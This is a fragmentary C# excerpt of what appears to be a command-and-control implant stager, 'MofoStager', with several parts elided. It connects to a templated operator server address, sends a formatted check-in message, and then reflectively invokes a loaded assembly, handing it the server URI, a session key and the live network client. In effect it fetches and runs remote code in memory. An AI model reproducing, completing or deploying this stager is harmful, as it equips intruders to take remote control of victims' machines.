...
namespace MofoStager
{
    public class MofoStager
    {
		...
		public void ExecLevel()
        {
            try
            {
                string LemonSqueezyURI = @"{{REP_LEMONSQUEEZY_URI}}";
                ...
                BridgeMessenger meSsenGer = new BridgeMessenger(LemonSqueezyURI, SOMEID, ProfileWriteFormat);
				meSsenGer.Connect();
				meSsenGer.Write(String.Format(ProfileWriteFormat, transformedResponse, SOMEID));
                ...
                string formatted = String.Format(ProfileWriteFormat, transformedResponse, SOMEID);
                ...
                mofoAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { LemonSqueezyURI, SOMEID, SessKEy, meSsenGer.client });
            }
